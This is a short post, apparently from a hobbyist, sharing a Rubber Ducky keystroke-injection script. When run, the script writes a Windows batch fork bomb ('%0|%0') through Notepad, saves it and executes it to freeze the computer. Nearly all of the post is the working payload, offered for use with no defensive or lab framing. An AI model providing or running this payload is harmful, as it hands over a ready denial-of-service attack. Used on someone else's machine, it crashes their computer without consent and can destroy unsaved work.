Hello! This payload will freeze the computer until you restart!
The way it works is it creates a batch file that will eat up all the computers memory!

```code
DELAY 1000
GUI r
DELAY 100
STRING notepad
DELAY 100
ENTER
DELAY 100
STRING %0|%0
CONTROL s
DELAY 100
STRING Duck Batch File.bat
TAB
DELAY 100
DOWNARROW
DELAY 100
DOWNARROW
DELAY 100
ENTER
DELAY 100
ENTER
DELAY 500
GUI s
DELAY 500
STRING Duck Batch File.bat
DELAY 100
ENTER
DELAY 100
```
